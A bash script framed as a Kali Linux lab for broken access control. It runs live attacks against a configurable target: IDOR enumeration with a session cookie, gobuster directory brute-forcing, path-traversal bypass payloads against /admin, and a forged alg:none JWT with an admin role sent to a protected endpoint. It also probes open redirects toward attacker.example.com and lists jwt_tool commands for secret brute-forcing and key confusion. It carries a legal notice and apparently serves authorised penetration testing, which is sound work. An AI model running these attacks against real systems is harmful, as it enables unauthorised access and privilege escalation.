#!/bin/bash
# ============================================================
# A01:2021 — Broken Access Control
# Kali Linux Attack & Analysis Script
# ============================================================
# Tools used: curl, gobuster, python3 (jwt_tool or manual JWT)
# Usage: bash a01_broken_access_control.sh
# ============================================================
# LEGAL NOTICE: Use only on systems you own or have explicit
# written permission to test. Unauthorised access is illegal.
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ─────────────────────────────────────────────
# CONFIGURATION — edit these before running
# ─────────────────────────────────────────────
TARGET="http://TARGET_IP_OR_DOMAIN"   # e.g. http://192.168.1.100 or http://dvwa.local
PORT="80"
WORDLIST="/usr/share/wordlists/dirb/common.txt"

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  A01:2021 — Broken Access Control Lab           ║"
echo "╚══════════════════════════════════════════════════╝${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 1: IDOR — Insecure Direct Object Reference
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] IDOR — Insecure Direct Object Reference${NC}"
echo -e "${YELLOW}    Cycling through object IDs to check for access control enforcement${NC}"
echo ""

ENDPOINT="/api/user/profile"    # Adjust to match target app endpoint
START_ID=1
END_ID=20

echo -e "    ${CYAN}Target endpoint:${NC} $TARGET$ENDPOINT?id=<ID>"
echo -e "    ${CYAN}Testing IDs ${START_ID} to ${END_ID}...${NC}"
echo ""

for id in $(seq $START_ID $END_ID); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 5 \
    -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE_HERE" \
    "$TARGET$ENDPOINT?id=$id")

  if [ "$RESPONSE" == "200" ]; then
    echo -e "    ${GREEN}[200 OK]${NC} id=$id — DATA RETURNED (possible IDOR!)"
  elif [ "$RESPONSE" == "403" ]; then
    echo -e "    ${RED}[403]${NC}    id=$id — Forbidden (access control working)"
  elif [ "$RESPONSE" == "404" ]; then
    echo -e "    [404]    id=$id — Not found"
  else
    echo -e "    [${RESPONSE}]   id=$id"
  fi
done

echo ""
echo -e "    ${YELLOW}[TIP] Replace YOUR_SESSION_COOKIE_HERE with a real session token.${NC}"
echo -e "    ${YELLOW}[TIP] Use Burp Suite > Intruder for more targeted IDOR testing.${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 2: Directory & Endpoint Discovery
# ─────────────────────────────────────────────
echo -e "${BOLD}[2] Directory & Hidden Endpoint Discovery (gobuster)${NC}"
echo -e "${YELLOW}    Discovering admin panels, backup files, and hidden paths${NC}"
echo ""
echo -e "    ${CYAN}Command:${NC}"
echo -e "    gobuster dir -u $TARGET -w $WORDLIST -x php,html,bak,txt -t 30 -q"
echo ""
echo -e "    ${CYAN}Running...${NC} (Ctrl+C to stop)"
echo ""

gobuster dir \
  -u "$TARGET" \
  -w "$WORDLIST" \
  -x php,html,bak,txt,json,xml,config \
  -t 30 \
  -q \
  --no-error \
  2>/dev/null || echo -e "    ${YELLOW}[!] gobuster failed or target unreachable. Check TARGET variable.${NC}"

echo ""
echo -e "    ${YELLOW}[TIP] Found an /admin or /config path? Try accessing it without auth.${NC}"
echo -e "    ${YELLOW}[TIP] Try ffuf for faster fuzzing: ffuf -u $TARGET/FUZZ -w $WORDLIST${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 3: Path Traversal Access Control Bypass
# ─────────────────────────────────────────────
echo -e "${BOLD}[3] Path Traversal / Access Control Bypass${NC}"
echo -e "${YELLOW}    Testing common bypass payloads against restricted endpoints${NC}"
echo ""

PROTECTED_PATH="/admin"
TRAVERSAL_PAYLOADS=(
  "/..;/$PROTECTED_PATH"
  "/%2e%2e;/$PROTECTED_PATH"
  "/public/../$PROTECTED_PATH"
  "/$PROTECTED_PATH/"
  "/$PROTECTED_PATH%20"
  "/$PROTECTED_PATH%09"
  "/$PROTECTED_PATH#"
  "/.//$PROTECTED_PATH"
)

echo -e "    ${CYAN}Testing path traversal bypasses for: $TARGET$PROTECTED_PATH${NC}"
echo ""
for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
  FULL_URL="$TARGET$payload"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$FULL_URL")
  if [ "$STATUS" == "200" ]; then
    echo -e "    ${GREEN}[200 BYPASS!]${NC} $payload"
  elif [ "$STATUS" == "403" ]; then
    echo -e "    ${RED}[403 BLOCKED]${NC} $payload"
  else
    echo -e "    [${STATUS}]         $payload"
  fi
done

echo ""

# ─────────────────────────────────────────────
# SECTION 4: JWT Analysis & Attacks
# ─────────────────────────────────────────────
echo -e "${BOLD}[4] JWT Analysis & Attack Techniques${NC}"
echo -e "${YELLOW}    Decoding, inspecting, and attacking JWT tokens${NC}"
echo ""

# Example JWT (replace with a real token from the target application)
SAMPLE_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

echo -e "    ${CYAN}[4a] Decoding JWT header and payload (base64)${NC}"
echo ""

decode_jwt_part() {
  # Add base64 padding if needed
  local part="$1"
  local padded="$part$(echo -n "$part" | awk '{n=length($0)%4; if(n==2) print "=="; else if(n==3) print "="; else print ""}')"
  echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null
}

HEADER=$(echo "$SAMPLE_JWT" | cut -d'.' -f1)
PAYLOAD=$(echo "$SAMPLE_JWT" | cut -d'.' -f2)

echo -e "    JWT Header:"
decode_jwt_part "$HEADER"
echo ""
echo -e "    JWT Payload:"
decode_jwt_part "$PAYLOAD"
echo ""

echo -e "    ${CYAN}[4b] Testing alg:none attack (signature stripping)${NC}"
echo ""

# Build a forged JWT with alg:none and escalated role
FORGED_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED_PAYLOAD=$(echo -n '{"sub":"1234567890","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED_JWT="${FORGED_HEADER}.${FORGED_PAYLOAD}."

echo -e "    Original JWT:  ${BOLD}$SAMPLE_JWT${NC}"
echo -e "    Forged JWT:    ${RED}${BOLD}$FORGED_JWT${NC}"
echo ""
echo -e "    ${CYAN}Testing forged token against target login endpoint...${NC}"
FORGED_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 5 \
  -H "Authorization: Bearer $FORGED_JWT" \
  "$TARGET/api/protected-resource" 2>/dev/null)
echo -e "    Server response: HTTP $FORGED_RESPONSE"
if [ "$FORGED_RESPONSE" == "200" ]; then
  echo -e "    ${RED}[VULNERABLE!]${NC} Server accepted alg:none token!"
else
  echo -e "    ${GREEN}[PROTECTED]${NC}  Server rejected forged token (HTTP $FORGED_RESPONSE)"
fi
echo ""

echo -e "    ${CYAN}[4c] jwt_tool — automated JWT vulnerability scanner${NC}"
echo ""
echo -e "    ${YELLOW}# Run these commands manually with a real token from the app:${NC}"
echo -e "    ${BOLD}# 1. Decode and analyse a token:${NC}"
echo -e "    python3 jwt_tool.py <YOUR_TOKEN_HERE>"
echo ""
echo -e "    ${BOLD}# 2. Test all known JWT attack vectors:${NC}"
echo -e "    python3 jwt_tool.py <TOKEN> -t http://TARGET/api/endpoint -rh 'Authorization: Bearer JWT'"
echo ""
echo -e "    ${BOLD}# 3. alg:none bypass:${NC}"
echo -e "    python3 jwt_tool.py <TOKEN> -X a"
echo ""
echo -e "    ${BOLD}# 4. Brute-force HS256 secret:${NC}"
echo -e "    python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt"
echo ""
echo -e "    ${BOLD}# 5. RS256 → HS256 key confusion (use server's public key as HMAC secret):${NC}"
echo -e "    python3 jwt_tool.py <TOKEN> -X k -pk server_public.pem"
echo ""

# ─────────────────────────────────────────────
# SECTION 5: Open Redirect Testing
# ─────────────────────────────────────────────
echo -e "${BOLD}[5] Open Redirect Detection${NC}"
echo -e "${YELLOW}    Testing redirect parameters for unvalidated redirects${NC}"
echo ""

REDIRECT_PARAMS=("redirect" "url" "next" "return" "returnUrl" "redir" "goto" "target" "dest" "destination" "continue" "forward")
EVIL_URL="http://attacker.example.com"

echo -e "    ${CYAN}Testing common redirect parameters on $TARGET/login${NC}"
echo ""
for param in "${REDIRECT_PARAMS[@]}"; do
  FULL_URL="$TARGET/login?${param}=${EVIL_URL}"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -L "$FULL_URL" 2>/dev/null)
  LOCATION=$(curl -s -o /dev/null -w "%{redirect_url}" --max-time 5 "$FULL_URL" 2>/dev/null)
  if echo "$LOCATION" | grep -q "attacker.example.com"; then
    echo -e "    ${RED}[REDIRECT!]${NC} ?${param}= → $LOCATION"
  else
    echo -e "    [${STATUS}]       ?${param}= — no open redirect"
  fi
done

echo ""
echo -e "${CYAN}${BOLD}[A01 Complete]${NC} Review findings above. Document all 200 responses and bypasses."
echo ""
